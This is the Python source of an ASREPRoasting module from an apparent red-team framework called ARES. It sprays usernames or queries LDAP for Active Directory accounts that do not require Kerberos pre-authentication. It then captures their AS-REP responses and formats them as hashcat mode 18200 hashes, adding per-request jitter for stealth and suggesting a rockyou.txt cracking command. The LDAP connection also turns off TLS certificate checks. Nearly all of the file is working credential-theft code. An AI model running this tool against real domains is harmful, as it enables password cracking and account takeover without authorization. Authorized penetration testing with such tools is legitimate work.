from __future__ import annotations
import asyncio
import re
"""
ASREPRoasting — impacket.krb5.kerberosv5 low-level API (impacket >=0.11 compatible)
MITRE: T1558.004 — Works fully unauthenticated with username list.

3 input modes:
  1. AUTHENTICATED — have creds -> LDAP query for noPreauth accounts (precise)
  2. USERFILE      — have file   -> spray usernames from file (no creds needed)
  3. USERNAMES     — have list   -> spray usernames from params (no creds needed)

Fix Bug 1: Drop GetNPUsers (impacket example script, broken in >=0.11).
           Use getKerberosTGT with password=\'\' directly — unauthenticated AS-REQ.
Fix Bug 2: Implement all 3 modes. No credentials required for userfile/usernames.
Fix Bug 3: Per-request jitter via noise.jitter.sleep(), not post-hoc batch sleep.
"""
from typing import Any
from ares.core.logger import get_logger

logger = get_logger("ares.modules.ad.asreproast")
from ares.core.campaign import Finding, Severity
from ares.core.security import sanitize_hostname, sanitize_ldap
from ares.modules.base import BaseModule, OpsecLevel
from ares.core.tracing import trace_module
from ares.core.errors import AresError, ModuleValidationError
from ares.modules.ad.dependencies import (
    ad_bind_dry_run_metadata,
    build_ad_bind_plan,
    classify_ad_ldap_bind_failure,
    ensure_ad_dependencies,
    sanitize_ad_username,
)


def _capture_asrep_raw(dc: str, domain: str, username: str) -> bytes | None:
    """
    Request an AS-REP without pre-auth through Impacket's supported Kerberos
    API and return its raw wire bytes.

    ``kerberoast_no_preauth=True`` makes getKerberosTGT return the raw AS-REP
    when the KDC omits pre-auth, even though ARES has no password with which
    to decrypt the ticket. This keeps request construction aligned with
    Impacket's KDC-compatible options and preserves the bytes needed by
    _format_krb5asrep_hash().

    Returns raw AS-REP bytes if account is ASREPRoastable, None otherwise.
    """
    try:
        from impacket.krb5 import constants
        from impacket.krb5.kerberosv5 import getKerberosTGT
        from impacket.krb5.types import Principal

        client = Principal(
            username,
            type=constants.PrincipalNameType.NT_PRINCIPAL.value,
        )
        # No padata — no pre-auth. If account has DONT_REQUIRE_PREAUTH, KDC responds with AS-REP.

        raw_rep, _cipher, _key, _session_key = getKerberosTGT(
            client,
            "",
            domain,
            b"",
            b"",
            aesKey=b"",
            kdcHost=dc,
            requestPAC=True,
            kerberoast_no_preauth=True,
        )
        return raw_rep

    except Exception as exc:
        msg = str(exc).upper()
        if "KDC_ERR_PREAUTH_REQUIRED" in msg or "PREAUTH_REQUIRED" in msg:
            return None   # account exists, preauth required → not vulnerable
        if "KDC_ERR_C_PRINCIPAL_UNKNOWN" in msg or "PRINCIPAL_UNKNOWN" in msg:
            return None   # username not in domain
        if "KDC_ERR_CLIENT_REVOKED" in msg or "CLIENT_REVOKED" in msg:
            return None   # account disabled
        raise


class ASREPParseError(ValueError):
    """The KDC response was not a supported AS-REP wire message."""


def _format_krb5asrep_hash(raw_asrep: bytes, username: str, domain: str) -> str:
    """
    Parse raw AS-REP wire bytes and format as $krb5asrep$ for hashcat mode 18200.

    enc-part layout (RC4 / etype 23):
        bytes  0–15 : HMAC-MD5 checksum
        bytes 16+   : ciphertext
    hashcat: $krb5asrep$etype$user@DOMAIN:checksum$ciphertext
    """
    try:
        from impacket.krb5.asn1 import AS_REP
        from pyasn1.codec.ber import decoder

        rep, _   = decoder.decode(raw_asrep, asn1Spec=AS_REP())
        enc      = rep["enc-part"]
        etype    = int(enc["etype"])
        cipher   = bytes(enc["cipher"])

        if len(cipher) < 16:
            raise ASREPParseError(
                "AS-REP response could not be parsed (InvalidASREPResponse)"
            )

        checksum   = cipher[:16].hex()
        ciphertext = cipher[16:].hex()
        return (
            f"$krb5asrep${etype}${username}@{domain.upper()}"
            f":{checksum}${ciphertext}"
        )
    except Exception as exc:
        raise ASREPParseError(
            f"AS-REP response could not be parsed ({type(exc).__name__})"
        ) from exc


def classify_asrep_outcome(
    mode: str,
    candidate_count: int,
    hash_count: int,
    failure_category: str = "",
    failure_reason: str = "",
) -> tuple[str, str]:
    """Explain an AS-REP run that did not produce a confirmed finding."""
    if hash_count:
        return "confirmed_findings", f"Captured {hash_count} AS-REP roastable result(s)."
    if candidate_count:
        category = failure_category or "operator_error"
        reason = failure_reason or "AS-REP material was not returned"
        return (
            category,
            (
                f"LDAP found {candidate_count} ASREPRoast candidate account(s), but "
                "Kerberos did not return AS-REP material. "
                f"Last Kerberos error: {reason}. "
                "Next steps: verify DoesNotRequirePreAuth on the account, KDC/port "
                "88, clock sync, account enabled/unlocked, and domain/realm correctness, "
                "then rerun."
            ),
        )
    if mode == "authenticated":
        return (
            "completed_no_findings",
            "LDAP completed successfully; no accounts without Kerberos pre-auth were found.",
        )
    return (
        "completed_no_findings",
        "The username input completed without AS-REP roast material; no condition was confirmed.",
    )


def _sanitize_asrep_failure_reason(value: Any) -> str:
    """Keep operator-facing AS-REP failure context bounded and secret-free."""
    text = " ".join(str(value).split())[:160]
    text = re.sub(
        r"(?i)\b(password|passwd|secret|token|api[_-]?key|nt_hash|lm_hash|krbtgt_hash)\b\s*([:=])\s*[^\s,;]+",
        r"\1\2[redacted]",
        text,
    )
    text = re.sub(r"(?i)\$krb5(?:asrep|tgs)\$[^\s]+", "[hash redacted]", text)
    return text or "AS-REP request failed without a reason"


def classify_asrep_request_error(exc: BaseException) -> tuple[str, str]:
    """Classify known Kerberos request failures without exposing raw details."""
    text = str(exc)
    lowered = text.lower()
    if "krb_ap_err_skew" in lowered or "clock skew too great" in lowered:
        return "operator_error", "KRB_AP_ERR_SKEW: Kerberos clock skew too great"
    if "kdc_err_wrong_realm" in lowered or "wrong realm" in lowered:
        return "operator_error", "KDC_ERR_WRONG_REALM: Kerberos realm mismatch"
    if "kdc_err_cannot_postdate" in lowered:
        return "operator_error", "KDC_ERR_CANNOT_POSTDATE: ticket not eligible for postdating"
    if any(marker in lowered for marker in (
        "invalid credentials",
        "logon failure",
        "kdc_err_preauth_failed",
        "authentication failed",
    )):
        return "operator_error", "invalid credentials"
    if any(marker in lowered for marker in (
        "timed out",
        "timeout",
        "connection refused",
        "unreachable",
        "no route to host",
        "network",
    )):
        return "network_error", _sanitize_asrep_failure_reason(exc)
    return "module_error", _sanitize_asrep_failure_reason(exc)


class ASREPRoastModule(BaseModule):
    """
    ad.asreproast — Capture AS-REP hashes from accounts without Kerberos pre-auth

    OPSEC: LOW
    MITRE: "T1558.004"
    OUTPUTS:  "asrep_hashes"
    """
    MODULE_ID          = "ad.asreproast"
    MODULE_NAME        = "ASREPRoasting"
    MODULE_CATEGORY    = "ad"
    MODULE_DESCRIPTION = "Capture AS-REP hashes from accounts without Kerberos pre-auth"
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    OPSEC_LEVEL        = OpsecLevel.LOW
    REQUIRES           = []
    OUTPUTS            = ["asrep_hashes"]
    MITRE_TECHNIQUES   = ["T1558.004"]

    async def validate(self, ctx: "Any") -> None:
        """Validate: dc + domain + at least one input mode present."""
        from ares.core.context import ExecutionContext
        if not isinstance(ctx, ExecutionContext):
            return
        dc     = ctx.params.get("dc") or ctx.target
        domain = ctx.params.get("domain") or ctx.domain
        if not dc:
            raise ModuleValidationError(
                "ad.asreproast requires \'dc\' (Domain Controller IP)",
                module_id=self.MODULE_ID, field="dc",
            )
        if not domain:
            raise ModuleValidationError(
                "ad.asreproast requires \'domain\' (e.g. corp.local)",
                module_id=self.MODULE_ID, field="domain",
            )
        ad        = self._extract_ad_params(ctx)
        has_creds = bool(ad["username"]) and bool(ad["password"])
        has_file  = bool(ctx.params.get("userfile"))
        has_list  = bool(ctx.params.get("usernames"))
        if not has_creds and not has_file and not has_list:
            raise ModuleValidationError(
                "ad.asreproast requires one of: domain credentials (username+password), "
                "\'userfile\' param (path to username list), or "
                "\'usernames\' param (inline list).",
                module_id=self.MODULE_ID, field="usernames",
            )

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """ExecutionContext-based entry point (v0.9.0+)."""
        from ares.modules.base import ModuleResult
        ad = self._extract_ad_params(ctx)
        dc, domain, username, password = ad["dc"], ad["domain"], ad["username"], ad["password"]
        userfile  = ctx.params.get("userfile")
        usernames = ctx.params.get("usernames", [])
        if getattr(ctx, "dry_run", False):
            if username and password:
                mode = "authenticated"
            elif userfile:
                mode = "userfile"
            else:
                mode = "usernames"
            raw = {
                "dry_run": True,
                "dc": dc,
                "domain": domain,
                "mode": mode,
                **ad_bind_dry_run_metadata(username, domain),
            }
            return ModuleResult(
                status="dry_run", module_id=self.MODULE_ID,
                raw=raw,
            )
        findings, raw = await self.run(
            dc=dc, username=username, password=password,
            domain=domain, userfile=userfile, usernames=usernames,
        )
        return ModuleResult(
            status="success" if (findings or raw) else "partial",
            findings=findings, raw=raw,
            module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("ad.asreproast")
    async def run(self, dc, domain, username=None, password=None,
                  userfile=None, usernames=None, **kwargs):
        ensure_ad_dependencies(
            ("impacket", "pyasn1", "pyasn1_modules"),
            module_id=self.MODULE_ID,
        )
        dc, domain = sanitize_hostname(dc), sanitize_ldap(domain)
        if username:
            username = sanitize_ad_username(username)
        await self.before_request(dc, "kerberos_tgs")

        has_creds = bool(username) and bool(password)
        has_file  = bool(userfile)

        if has_creds:
            mode = "authenticated"
        elif has_file:
            mode = "userfile"
        else:
            mode = "usernames"

        logger.info("asreproast_start", dc=dc, domain=domain, mode=mode)

        self._last_candidate_count = 0
        self._last_hash_failure_category = ""
        self._last_hash_failure_reason = ""
        try:
            hashes, accounts = await self._get_asrep_hashes(
                dc, domain, username, password, userfile, usernames or [], mode
            )
        except AresError:
            raise
        except Exception as exc:
            from ares.core.errors import NetworkError
            raise NetworkError(f"ASREPRoast failed: {exc}") from exc

        raw = {
            "asrep_hashes": hashes,
            "vulnerable_accounts": accounts,
            "mode": mode,
        }
        if not hashes:
            category, message = classify_asrep_outcome(
                mode,
                self._last_candidate_count,
                len(hashes),
                self._last_hash_failure_category,
                self._last_hash_failure_reason,
            )
            raw["outcome_category"] = category
            raw["outcome_message"] = message
            raw["candidate_count"] = self._last_candidate_count
            if self._last_hash_failure_reason:
                raw["asrep_failure_category"] = self._last_hash_failure_category
                raw["asrep_failure_reason"] = self._last_hash_failure_reason
            if self._last_candidate_count:
                logger.warning(
                    "asreproast_candidates_no_hash",
                    candidates=self._last_candidate_count,
                    reason=self._last_hash_failure_reason
                    or "AS-REP material was not returned",
                )
        self._analyze(raw)
        return self._findings, raw

    async def _get_asrep_hashes(
        self, dc, domain, username, password, userfile, usernames, mode
    ):
        """
        Low-level impacket implementation — no wrapper scripts.

        For unauthenticated AS-REQ: send getKerberosTGT with password=''.
          KDC_ERR_PREAUTH_REQUIRED  -> account exists, NOT vulnerable
          KDC_ERR_C_PRINCIPAL_UNKNOWN -> username does not exist
          Success (returns AS-REP)  -> account IS vulnerable, hash captured
        """
        ensure_ad_dependencies(
            ("impacket", "pyasn1", "pyasn1_modules"),
            module_id=self.MODULE_ID,
        )
        from impacket.krb5.kerberosv5 import getKerberosTGT
        from impacket.krb5.types import Principal
        from impacket.krb5 import constants

        # Build target list
        targets: list[str] = []
        if mode == "authenticated":
            targets = await self._ldap_get_nopreauth(dc, domain, username, password)
            logger.info("asreproast_ldap_targets", count=len(targets))
        elif mode == "userfile":
            try:
                with open(userfile, "r", errors="replace") as fh:
                    targets = [ln.strip() for ln in fh if ln.strip()]
            except OSError as exc:
                raise ValueError(f"Cannot read userfile {userfile!r}: {exc}") from exc
        else:
            targets = list(usernames)

        self._last_candidate_count = len(targets)

        if not targets:
            return [], []

        loop     = asyncio.get_running_loop()
        hashes:   list[str] = []
        accounts: list[str] = []

        for i, uname in enumerate(targets):
            uname = uname.strip()
            if not uname:
                continue

            def _try_asreq(u=uname):
                """
                Issue #4 fix: use sendReceive directly to capture raw AS-REP wire bytes.
                getKerberosTGT() parses the response before returning — tgt[0] is
                a parsed TGT object, not raw AS-REP bytes. _format_krb5asrep_hash()
                needs raw bytes to extract enc-part for hashcat.
                """
                logger.info("asreproast_hash_request_start", username=u[:120])
                try:
                    raw_result = _capture_asrep_raw(dc, domain, u)
                except Exception as exc:
                    category, reason = classify_asrep_request_error(exc)
                    logger.warning(
                        "asreproast_hash_request_failed",
                        username=u[:120],
                        reason=reason,
                    )
                    return None, category, reason
                if raw_result is None:
                    reason = "AS-REP material was not returned"
                    logger.warning(
                        "asreproast_hash_request_failed",
                        username=u[:120],
                        reason=reason,
                    )
                    return None, "operator_error", reason
                return raw_result, "", ""

            raw_asrep, failure_category, failure_reason = await loop.run_in_executor(
                None, _try_asreq
            )
            if raw_asrep is not None:
                try:
                    hash_str = _format_krb5asrep_hash(raw_asrep, uname, domain)
                except ASREPParseError as exc:
                    failure_category = "module_error"
                    failure_reason = (
                        f"{exc}; candidate={uname[:120]}; "
                        "response was malformed or unsupported"
                    )
                    logger.warning(
                        "asreproast_hash_request_failed",
                        username=uname[:120],
                        reason=failure_reason,
                    )
                else:
                    if hash_str:
                        hashes.append(hash_str)
                        accounts.append(uname)
                        logger.info("asreproast_hash_captured", username=uname)
                    else:
                        failure_category = "module_error"
                        failure_reason = (
                            f"AS-REP response could not be parsed; candidate={uname[:120]}; "
                            "response was malformed or unsupported"
                        )
                        logger.warning(
                            "asreproast_hash_request_failed",
                            username=uname[:120],
                            reason=failure_reason,
                        )

            if failure_reason:
                self._last_hash_failure_category = failure_category
                self._last_hash_failure_reason = _sanitize_asrep_failure_reason(
                    failure_reason
                )

            # per-request jitter
            if i < len(targets) - 1:
                await self.noise.jitter.sleep()

        return hashes, accounts

    async def _ldap_get_nopreauth(self, dc, domain, username, password):
        """Query LDAP for accounts with DONT_REQUIRE_PREAUTH enabled."""
        ensure_ad_dependencies(("ldap3",), module_id=self.MODULE_ID)
        import ssl
        import ldap3
        from ldap3 import Server, Connection, SUBTREE, Tls, ALL
        from ldap3.core.exceptions import LDAPBindError

        bind_plan = build_ad_bind_plan(username, domain)
        conn = None
        last_error = None
        for port, use_ssl in [(636, True), (389, False)]:
            try:
                tls_arg = Tls(validate=ssl.CERT_NONE) if use_ssl else None
                server  = Server(dc, port=port, use_ssl=use_ssl,
                                 tls=tls_arg, get_info=ALL, connect_timeout=10)
                conn_kwargs = dict(
                    user=bind_plan.user,
                    password=password,
                    auto_bind=ldap3.AUTO_BIND_NONE,
                    receive_timeout=30,
                )
                if bind_plan.mode == "ntlm":
                    conn_kwargs["authentication"] = ldap3.NTLM
                conn = Connection(server, **conn_kwargs)
                if not conn.bind():
                    result = getattr(conn, "result", {}) or {}
                    raise classify_ad_ldap_bind_failure(
                        LDAPBindError("LDAP bind returned false"),
                        module_id=self.MODULE_ID,
                        dc=dc,
                        bind_plan=bind_plan,
                        result=result,
                    )
                break
            except AresError:
                raise
            except Exception as exc:
                logger.debug("asreproast_ldap_bind_failed",
                             port=port, bind_mode=bind_plan.mode,
                             username_format=bind_plan.username_format,
                             error=str(exc)[:80])
                last_error = classify_ad_ldap_bind_failure(
                    exc,
                    module_id=self.MODULE_ID,
                    dc=dc,
                    bind_plan=bind_plan,
                )
                if isinstance(last_error, ModuleValidationError):
                    raise last_error
                conn = None

        if conn is None:
            if last_error is not None:
                raise last_error
            raise ConnectionError(f"LDAP bind failed on {dc}")

        base = ",".join(f"DC={p}" for p in domain.upper().split("."))
        # UAC bit 0x400000 = DONT_REQUIRE_PREAUTH, bit 0x2 = ACCOUNTDISABLE
        nopreauth_filter = (
            "(&(objectClass=user)(objectCategory=person)"
            "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
            "(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
        )
        targets: list[str] = []
        try:
            cookie: bool | bytes = True
            while cookie:
                conn.search(
                    base, nopreauth_filter,
                    search_scope=SUBTREE,
                    paged_size=200,
                    paged_cookie=None if cookie is True else cookie,
                    attributes=["sAMAccountName"],
                )
                for e in conn.entries:
                    targets.append(str(e.sAMAccountName))
                cookie = (
                    conn.result.get("controls", {})
                        .get("1.2.840.113556.1.4.319", {})
                        .get("value", {})
                        .get("cookie")
                )
        finally:
            try:
                conn.unbind()
            except Exception:
                pass
        return targets

    def _analyze(self, raw):
        hashes   = raw.get("asrep_hashes", [])
        accounts = raw.get("vulnerable_accounts", [])
        if not hashes:
            return
        self.finding(
            title       = f"ASREPRoast Hashes Captured ({len(hashes)})",
            description = (
                f"Captured {len(hashes)} AS-REP hashes — crackable offline without "
                "domain credentials. hashcat mode 18200."
            ),
            severity        = Severity.HIGH,
            mitre_technique = "T1558.004",
            mitre_tactic    = "Credential Access",
            evidence        = {
                "accounts":     accounts[:10],
                "hash_count":   len(hashes),
                "hashcat_mode": 18200,
                "hashcat_cmd":  "hashcat -m 18200 hashes.txt rockyou.txt",
                "sample_hash":  hashes[0][:80] + "..." if hashes else "",
            },
            remediation = "Enable Kerberos pre-authentication on ALL accounts.",
            host        = "",
        )
